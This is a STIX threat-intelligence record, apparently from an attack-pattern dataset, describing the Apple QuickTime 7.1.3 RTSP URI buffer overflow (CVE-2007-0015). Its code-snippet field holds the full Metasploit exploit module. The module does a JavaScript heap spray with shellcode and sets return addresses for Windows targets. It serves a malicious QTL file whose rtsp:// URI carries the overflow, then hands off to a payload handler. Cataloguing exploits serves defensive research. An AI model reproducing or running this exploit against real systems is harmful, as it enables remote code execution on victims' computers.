{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42a11b15-ce5c-4b2b-a930-2897d966d019",
    "created": "2024-08-14T16:42:20.236177Z",
    "modified": "2024-08-14T16:42:20.236181Z",
    "name": "Apple QuickTime 7.1.3 RTSP URI Buffer Overflow",
    "description": " This module exploits a buffer overflow in Apple QuickTime 7.1.3. This module was inspired by MOAB-01-01-2007.  The Browser target for this module was tested against IE 6 and Firefox 1.5.0.3 on Windows XP SP0/2; Firefox 3 blacklists the QuickTime plugin. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_quicktime_rtsp.rb",
            "external_id": "apple_quicktime_rtsp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0015"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  # No particular browser.  Works on at least IE6 and Firefox 1.5.0.3\n  #  :javascript => true,\n  #  :rank       => NormalRanking, # reliable memory corruption\n  #  :vuln_test  => nil,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QuickTime 7.1.3 RTSP URI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Apple QuickTime\n        7.1.3. This module was inspired by MOAB-01-01-2007.  The\n        Browser target for this module was tested against IE 6 and\n        Firefox 1.5.0.3 on Windows XP SP0/2; Firefox 3 blacklists the\n        QuickTime plugin.\n      },\n      'Author'         => [ 'MC', 'egypt' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-0015' ],\n          [ 'OSVDB', '31023'],\n          [ 'BID', '21829' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\\x5c\",\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Apple QuickTime Player 7.1.3',\n            {\n              'Ret' => 0x6855d8a2  # xpsp2/2k3 :( | vista ;)\n            }\n          ],\n          [ 'Browser Universal',\n            {\n              'Ret' => 0x0c0c0c0c # tested on xpsp0 and sp2\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2007-01-01',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(client, request)\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    if (target.name =~ /Automatic/)\n      if (request['User-Agent'] =~ /QuickTime/i)\n        target = targets[1]\n      else\n        target = targets[2]\n      end\n    end\n\n    cruft  =  rand_text_alphanumeric(4)\n    # This is all basically filler on the browser target because we can't\n    # expect the SEH to be in a reliable place across multiple browsers.\n    # Heap spray ftw.\n    sploit =  rand_text_english(307)\n    sploit << p.encoded + \"\\xeb\\x06\" + rand_text_english(2)\n    sploit << [target.ret].pack('V') + [0xe8, -485].pack('CV')\n\n    if (request['User-Agent'] =~ /QuickTime/i or request.uri =~ /\\.qtl$/)\n      print_status(\"Sending exploit QTL file (target: #{target.name})\")\n      content = build_qtl(sploit)\n    else\n      print_status(\"Sending init HTML\")\n\n      shellcode = Rex::Text.to_unescape(p.encoded)\n      url =  ((datastore['SSL']) ? \"https://\" : \"http://\")\n      url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(client.peerhost) : datastore['SRVHOST'])\n      url << \":\" + datastore['SRVPORT'].to_s\n      url << get_resource\n      js = <<-ENDJS\n          #{js_heap_spray}\n          sprayHeap(unescape(\"#{shellcode}\"), 0x#{target.ret.to_s 16}, 0x4000);\n        ENDJS\n      content =  \"<html><body><script><!--\\n#{js}//--></script>\"\n      content << <<-ENDEMBED\n          <OBJECT\n          CLASSID=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\"\n          WIDTH=\"1\"\n          HEIGHT=\"1\"\n          CODEBASE=\"http://www.apple.com/qtactivex/qtplugin.cab\">\n          <PARAM name=\"SRC\"        VALUE = \"#{url}/#{cruft}.qtl\">\n          <PARAM name=\"QTSRC\"      VALUE = \"#{url}/#{cruft}.qtl\">\n          <PARAM name=\"AUTOPLAY\"   VALUE = \"true\"               >\n          <PARAM name=\"TYPE\"       VALUE = \"video/quicktime\"    >\n          <PARAM name=\"TARGET\"     VALUE = \"myself\"             >\n          <EMBED\n            SRC        = \"#{url}/#{cruft}.qtl\"\n            QTSRC      = \"#{url}/#{cruft}.qtl\"\n            TARGET     = \"myself\"\n            WIDTH      = \"1\"\n            HEIGHT     = \"1\"\n            AUTOPLAY   = \"true\"\n            PLUGIN     = \"quicktimeplugin\"\n            TYPE       = \"video/quicktime\"\n            CACHE      = \"false\"\n            PLUGINSPAGE= \"http://www.apple.com/quicktime/download/\" >\n          </EMBED>\n          </OBJECT>\n        ENDEMBED\n      content << \"</body></html>\"\n    end\n\n    send_response(client, content, { 'Content-Type' => \"text/html\" })\n\n    # Handle the payload\n    handler(client)\n  end\n\n  def build_qtl(overflow)\n    cruft  =  rand_text_english(4)\n\n    content =  \"<?xml version=\\\"1.0\\\"?>\\n\"\n    content << \"<?quicktime type=\\\"application/x-quicktime-media-link\\\"?>\\n\"\n    content << \"<embed autoplay=\\\"true\\\" \\n\"\n    content << \"moviename=\\\"#{cruft}\\\" \\n\"\n    content << \"qtnext=\\\"#{cruft}\\\" \\n\"\n    content << \"type=\\\"video/quicktime\\\" \\n\"\n    content << \"src=\\\"rtsp://#{cruft}:#{overflow}\\\" />\\n\"\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-01-01",
    "x_mitre_platforms": [
        "win'"
    ]
}